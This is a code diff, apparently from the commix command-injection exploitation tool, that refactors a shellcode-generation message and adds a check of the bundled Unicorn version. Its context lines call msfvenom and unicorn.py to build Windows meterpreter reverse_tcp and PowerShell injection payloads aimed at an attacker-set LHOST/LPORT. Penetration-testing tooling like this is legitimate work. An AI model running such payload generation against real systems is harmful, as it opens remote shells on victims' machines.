@@ -20,6 +20,7 @@ import time
 import base64
 import subprocess
 from src.utils import menu
+from src.utils import update
 from src.utils import settings
 from src.thirdparty.colorama import Fore, Back, Style, init
 
@@ -49,6 +50,12 @@ def shell_options(option):
       check_uripath(option[12:])
   else:
     return option
+
+# Payload generation message.
+def gen_payload_msg(payload):
+  info_msg = "Generating the '" + payload + "' shellcode... "
+  sys.stdout.write(settings.print_info_msg(info_msg))
+  sys.stdout.flush()
 
 """
 Success msg.
@@ -382,6 +389,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
     
     # Powershell injection attacks
     elif other_shell == '7':
+
       if not settings.TARGET_OS == "win":
         windows_only_attack_vector()
         continue
@@ -415,14 +423,10 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
             continue
 
           payload = "windows/meterpreter/reverse_tcp"
-          # Define standard metasploit payload
-          if windows_reverse_shell != '3':
-            info_msg = "Generating the '" + payload + "' shellcode... "
-            sys.stdout.write(settings.print_info_msg(info_msg))
-            sys.stdout.flush()
 
           # Shellcode injection with native x86 shellcode
           if windows_reverse_shell == '1':
+            gen_payload_msg(payload)
             try:
               proc = subprocess.Popen("msfvenom -p " + str(payload) + " LHOST=" + str(settings.LHOST) + " LPORT=" + str(settings.LPORT) + " -f c -o " + output + ">/dev/null 2>&1", shell=True).wait()
               with open(output, 'r') as content_file:
@@ -450,6 +454,15 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
               current_path = os.getcwd()
               unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
               os.chdir(unicorn_path)
+              # Check for Unicorn version.
+              with open('unicorn.py') as unicorn_file:
+                for line in unicorn_file:
+                  line = line.rstrip()
+                  if "Magic Unicorn Attack Vector v" in line:
+                    unicorn_version = line.replace("Magic Unicorn Attack Vector v", "").replace(" ", "").replace("-","").replace("\"","").replace(")","")
+                    break 
+              update.check_unicorn_version(unicorn_version)
+              gen_payload_msg(payload)
               subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
               with open(output, 'r') as content_file:
                 other_shell = content_file.read().replace('\n', '')
